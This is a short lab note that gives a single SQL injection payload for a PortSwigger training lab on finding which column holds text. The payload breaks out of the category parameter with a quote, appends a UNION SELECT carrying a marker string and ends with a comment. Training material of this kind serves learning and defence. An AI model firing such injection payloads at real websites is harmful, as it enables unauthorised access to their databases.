# Lab

https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

## Payload

```sql
/filter?category=Accessories' UNION SELECT NULL,'BX90s2',NULL--
```